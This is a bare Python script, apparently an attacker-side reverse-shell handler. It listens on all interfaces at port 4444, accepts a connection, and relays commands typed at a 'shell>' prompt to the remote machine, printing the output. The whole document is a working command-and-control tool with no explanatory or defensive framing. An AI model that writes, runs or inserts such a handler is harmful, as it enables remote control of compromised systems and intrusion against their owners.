import socket

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444       # Port to listen on

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")
    with conn:
        while True:
            cmd = input("shell> ")
            if cmd.lower() == "exit":
                conn.sendall(b"exit\n")
                break
            if cmd.strip() == "":
                continue
            conn.sendall(cmd.encode() + b"\n")
            
            data = b""
            while True:
                part = conn.recv(1024)
                if not part:
                    break
                data += part
                if len(part) < 1024:
                    break
            print(data.decode(), end="")
